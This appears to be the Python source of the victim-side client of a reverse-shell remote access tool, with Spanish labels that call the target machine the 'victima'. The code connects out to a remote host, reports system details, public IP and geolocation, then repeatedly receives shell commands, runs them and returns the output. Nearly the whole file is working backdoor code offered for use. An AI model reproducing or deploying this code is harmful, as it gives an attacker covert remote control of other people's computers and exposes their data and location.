#! /usr/bin/python3.9

from conexions import connect
from sys import exit, executable
from subprocess import getoutput
from socket import gethostname
from time import sleep, localtime
from os import getcwd, chdir
from requests import get
from re import search
from json import dumps
from ast import literal_eval
from requests.exceptions import ConnectionError

import platform

def main(RHOST, RPORT, ENCRIPT):

    class _Main:

        def __init__(self, RHOST, RPORT, ENCRIPT):

            self._RHOST = RHOST
            self._RPORT = RPORT
            self._Buffer = 1024 * 4
            self._CONNECT = connect(self._RHOST, self._RPORT)
            self._ENCRIPT = ENCRIPT
            self._Comando = ""
            self.localhost = gethostname()
            self.Time = "{}/{}/{} {}:{}:{}".format(localtime()[0], localtime()[1], localtime()[2], localtime()[3], localtime()[4], localtime()[5])
            self._Color = self._COLOR()
            self._cwd = getcwd()
            self._Cursor = ""

        class _COLOR:
          
            def __init__(self):
       
                self.BLACK           =  "\033[30m"
                self.RED             =  "\033[31m"
                self.GREEN           =  "\033[32m"
                self.YELLOW          =  "\033[33m"
                self.BLUE            =  "\033[34m"
                self.MAGENTA         =  "\033[35m"
                self.CYAN            =  "\033[36m"
                self.WHITE           =  "\033[37m"
                self.RESET           =  "\033[39m"

                self.LIGHTBLACK_EX   =  "\033[90m"
                self.LIGHTRED_EX     =  "\033[91m"
                self.LIGHTGREEN_EX   =  "\033[92m"
                self.LIGHTYELLOW_EX  =  "\033[93m"
                self.LIGHTBLUE_EX    =  "\033[94m"
                self.LIGHTMAGENTA_EX =  "\033[95m"
                self.LIGHTCYAN_EX    =  "\033[96m"
                self.LIGHTWHITE_EX   =  "\033[97m"

            def UP(self, n=1):
                return '\033[' + str(n) + 'A'
            def DOWN(self, n=1):
                return '\033[' + str(n) + 'B'
            def FORWARD(self, n=1):
                return '\033[' + str(n) + 'C'
            def BACK(self, n=1):
                return '\033[' + str(n) + 'D'
            def POS(self, x=1, y=1):
                return '\033[' + str(y) + ';' + str(x) + 'H'
            def SET_TITLE(self, text):
                return "\033]2;{}\007".format(text)
            def CLEAR(self):
                return "\033[3J\033[H\033[2J"
            def POINTGREEN(self, text1="", text2=""):
                return self.LIGHTGREEN_EX+"["+self.BLUE+"*"+self.LIGHTGREEN_EX+"] "+self.LIGHTWHITE_EX+text1+text2+self.LIGHTWHITE_EX
            def POINTRED(self, text=""):
                return self.LIGHTYELLOW_EX+"["+self.RED+"*"+self.LIGHTYELLOW_EX+"] "+self.LIGHTMAGENTA_EX+text+"\n"+self.LIGHTWHITE_EX

        def _CLEAR(self):
            del(self)

        def _GET_PUBLIC_IP(self):
            try:
                try:
                    r = get("https://es.geoipview.com/")
                    data = r.text
                    r.close()
                    del (r)
                    patron1 = r"([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})"
                    x = search(patron1, data)
                    if x:
                        ip = x[0]
                    else:
                        ip = ""
                    del(x)

                    gecalizacion = []
                    patron2 = r"\-?[0-9]{1,3}\.[0-9]{1,10}"
                    for x in range(2):
                        if len(gecalizacion) == 0:
                            x = search(patron2, data)
                        elif len(gecalizacion) == 1:
                            patron2 = r"\-[0-9]{1,3}\.[0-9]{1,10}"
                            x = search(patron2, data)
                        if x:
                            gecalizacion.append(x[0])
                        else:
                            localicationX = ""
                        del(x)
            
            
                    return [ip, {"Latitud":str(gecalizacion[0]), "Longitud":str(gecalizacion[1])}]
                except ConnectionError:
                    return 1 # is a error
            except ValueError:
                return 2 # is a error

        def _OsInfo(self):
            return {

                1  : self._Color.POINTGREEN( "El sistema operativo victima es: ",              str(platform.system())                            ),
                2  : self._Color.POINTGREEN( "Tiempo actual: ",                                str(self.Time)                                    ),
                3  : self._Color.POINTGREEN( "Directorio: ",                                   str(self._cwd)                                    ),
                4  : self._Color.POINTGREEN( "Nombre del equipo: ",                            str(platform.node())+"/"+str(gethostname())       ),
                5  : self._Color.POINTGREEN( "Ip publica de la maquina es: ",                  str(self.public_ip)                               ),
                6  : self._Color.POINTGREEN( "Buffer Cliente: ",                               str(self._Buffer)                                 ),
                7  : self._Color.POINTGREEN( "Tipo de conexion: ",                             str(self._CONNECT._CONNECT)                       ),
                8  : self._Color.POINTGREEN( "Ejecutable de pythhon con el que se ejecuta: ",  str(platform.architecture(executable , '' , ''))  ),
                9  : self._Color.POINTGREEN( "Estructura: ",                                   str(platform.machine())                           ),
                10 : self._Color.POINTGREEN( "Sistema operativo: ",                            str(platform.platform(0, 0))                      ),
                11 : self._Color.POINTGREEN( "Nombre real del Procesador: ",                   str(platform.processor())                         ),
                12 : self._Color.POINTGREEN( "Info de la version python: ",                    str(platform.python_build())                      ),
                13 : self._Color.POINTGREEN( "Compilador de python: ",                         str(platform.python_compiler())                   ),
                14 : self._Color.POINTGREEN( "Implementacion de python: ",                     str(platform.python_implementation())             ),
                15 : self._Color.POINTGREEN( "Version del sistema: ",                          str(platform.release())                           ),
                16 : self._Color.POINTGREEN( "" ),
                17 : self._Color.POINTGREEN(str(platform.uname())),
                18 : self._Cursor,

            }

        def main(self):
    
            self.public_ip = self._GET_PUBLIC_IP()
            if self.public_ip == 1:
                self.public_ip = "no se pudo obtener esta informacion"
                    
            #_Color = self._COLOR()
            self.Time = "{}/{}/{} {}:{}:{}".format(localtime()[0], localtime()[1], localtime()[2], localtime()[3], localtime()[4], localtime()[5])
            self._Cursor = "{}{}{}@{}{}{}|{}[{}{}] {}>>: ".format(
                _Main._COLOR().LIGHTBLUE_EX,    gethostname(), 
                _Main._COLOR().LIGHTWHITE_EX,   _Main._COLOR().LIGHTRED_EX,  self.Time, 
                _Main._COLOR().LIGHTCYAN_EX,    _Main._COLOR().LIGHTYELLOW_EX, 
                self._cwd,                      _Main._COLOR().LIGHTYELLOW_EX, 
                _Main._COLOR().LIGHTMAGENTA_EX)


            self._CONNECT._Connect()
            self._Comando = self._OsInfo()

            if self._ENCRIPT==False:
                data = dumps(self._Comando)
                data = data.encode()
                data = len(data)+1024
                data = str(data)
                self._CONNECT._Send(data, self._ENCRIPT)
                sleep(0.2)
            self._CONNECT._Send(dumps(self._Comando), self._ENCRIPT)

            while True:
                self._cwd = getcwd()
                self.Time = "{}/{}/{} {}:{}:{}".format(localtime()[0], localtime()[1], localtime()[2], localtime()[3], localtime()[4], localtime()[5])
                self._Cursor = "{}{}{}@{}{}{}|{}[{}{}] {}>>: ".format(
                    _Main._COLOR().LIGHTBLUE_EX,    gethostname(), 
                    _Main._COLOR().LIGHTWHITE_EX,   _Main._COLOR().LIGHTRED_EX,  self.Time, 
                    _Main._COLOR().LIGHTCYAN_EX,    _Main._COLOR().LIGHTYELLOW_EX, 
                    self._cwd,                      _Main._COLOR().LIGHTYELLOW_EX, 
                    _Main._COLOR().LIGHTMAGENTA_EX
                )

                self._Comando = str(self._CONNECT._Recv(self._Buffer, self._ENCRIPT))
                if self._Comando[:4] == "exit":
                    self._CONNECT._Send("[*] Conexion cerrada\033[39m", self._ENCRIPT)
                    self._CONNECT._Close(False)
                    self._CLEAR()
                    exit(0)

                elif self._Comando[:10] == "systeminfo":
                    self._Comando = self._OsInfo()
                    
                elif self._Comando[:3] == "cwd":
                    self._cwd = getcwd()
                    self._Comando = {
                        "cursor" : self._Cursor,
                        "tiempo actual" : self.Time,
                        "ruta actual" : self._cwd,
                        "estado": 0
                    }
                elif self._Comando[:2] == "cd":
                    try:
                        chdir(self._Comando[3:])
                        self._Comando = {
                            "cursor" : self._Cursor,
                            "tiempo actual" : self.Time,
                            "ruta antigua":self._cwd,
                            "ruta actual":getcwd(),
                            "estado":0 # is a correct
                        }
                    except IsADirectoryError:
                        self._Comando = {
                            "cursor" : self._Cursor,
                            "tiempo actual" : self.Time,
                            "ruta antigua":self._cwd,
                            "ruta actual":getcwd(),
                            "estado":3 # 3 is a error
                        }
                    except FileNotFoundError:
                        self._Comando = {
                            "cursor" : self._Cursor,
                            "tiempo actual" : self.Time,
                            "ruta antigua":self._cwd,
                            "ruta actual":getcwd(),
                            "estado":4 # 4 is a error
                        }
                    self._cwd = getcwd()
                else:
                    try:
                        self._Comando = {
                            "cursor" : self._Cursor,
                            "comando-data":getoutput(self._Comando),  
                            "tiempo actual" : self.Time,
                            "ruta actual" : self._cwd,
                        }
                        if self._ENCRIPT==False:
                            data = dumps(self._Comando)
                            data = data.encode()
                            data = len(data)+1024
                            data = str(data)
                            self._CONNECT._Send(data, self._ENCRIPT)
                            sleep(0.2)
                            self._CONNECT._Send(dumps(self._Comando), self._ENCRIPT)
                        continue
                    except UnicodeDecodeError:
                        self._Comando = {
                            "cursor" : self._Cursor,
                            "comando-data":self._Color.POINTRED("Este comando genero un error de descodificacion unicode."),
                            "tiempo actual" : self.Time,
                            "ruta actual" : self._cwd,
                        }
                    
                if self._ENCRIPT==False:
                    data = dumps(self._Comando)
                    data = data.encode()
                    data = len(data)+1024
                    data  = str(data)
                    sleep(0.2)
                    self._CONNECT._Send(data, self._ENCRIPT)
                    sleep(0.2)
                self._CONNECT._Send(dumps(self._Comando), self._ENCRIPT)

 
    return _Main(RHOST, RPORT, ENCRIPT)

if __name__ == "__main__":
    print("buen intento")
    exit()